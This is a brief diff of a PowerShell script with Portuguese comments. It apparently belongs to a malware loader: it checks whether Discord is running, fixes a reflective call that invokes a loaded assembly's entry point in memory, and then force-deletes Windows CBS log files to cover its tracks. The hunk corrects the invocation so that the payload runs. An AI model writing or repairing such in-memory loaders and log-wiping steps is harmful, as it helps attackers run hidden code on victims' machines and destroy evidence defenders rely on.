@@ -46,7 +46,7 @@ if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
 # --- CORREÇÃO 2: Invoke com array correto ---
 $invokeArgs = New-Object object[] 1 
 $invokeArgs[0] = [string[]]@() 
-$entry.Invoke($null, @($invokeArgs))  # <-- CORRIGIDO AQUI
+$entry.Invoke($null, [object[]]@())
 
 # --- LIMPEZA (sem erros) ---
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
